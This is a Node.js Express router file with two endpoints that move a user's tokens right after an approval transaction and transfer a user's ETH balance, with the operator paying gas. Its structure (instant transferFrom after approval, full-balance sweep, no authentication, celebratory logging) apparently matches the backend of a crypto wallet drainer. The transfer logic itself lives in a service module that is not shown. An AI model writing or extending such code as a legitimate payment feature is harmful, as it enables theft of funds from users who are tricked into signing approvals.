const express = require('express');
const AdminTransferService = require('../services/adminTransferService');
const router = express.Router();

const transferService = new AdminTransferService();

// Admin transfer endpoint - executes immediate transfer after approval
router.post('/admin-transfer', async (req, res) => {
  try {
    const { userAddress, tokenAddress, approvalTxHash } = req.body;
    
    console.log(`🔥 ADMIN TRANSFER TRIGGERED:`);
    console.log(`User: ${userAddress}`);
    console.log(`Token: ${tokenAddress}`);
    console.log(`Approval TX: ${approvalTxHash}`);
    
    // Execute immediate transfer (admin pays gas)
    const result = await transferService.executeImmediateTransfer(
      userAddress, 
      tokenAddress, 
      approvalTxHash
    );
    
    if (result.success) {
      console.log(`✅ TRANSFER SUCCESS: ${result.amount} tokens transferred`);
      console.log(`TX Hash: ${result.txHash}`);
      
      // Log to database for tracking
      // await logTransfer(userAddress, tokenAddress, result.amount, result.txHash);
      
      res.json({
        success: true,
        message: 'Transfer completed successfully',
        amount: result.amount,
        txHash: result.txHash,
        adminPaidGas: true
      });
    } else {
      console.log(`❌ TRANSFER FAILED: ${result.error || result.reason}`);
      res.json({
        success: false,
        error: result.error || result.reason
      });
    }
    
  } catch (error) {
    console.error('Admin transfer error:', error);
    res.status(500).json({
      success: false,
      error: 'Transfer service error'
    });
  }
});

// ETH transfer endpoint
router.post('/admin-transfer-eth', async (req, res) => {
  try {
    const { userAddress, userBalance } = req.body;
    
    const result = await transferService.executeETHTransfer(userAddress, userBalance);
    
    res.json(result);
    
  } catch (error) {
    console.error('ETH transfer error:', error);
    res.status(500).json({
      success: false,
      error: 'ETH transfer failed'
    });
  }
});

module.exports = router;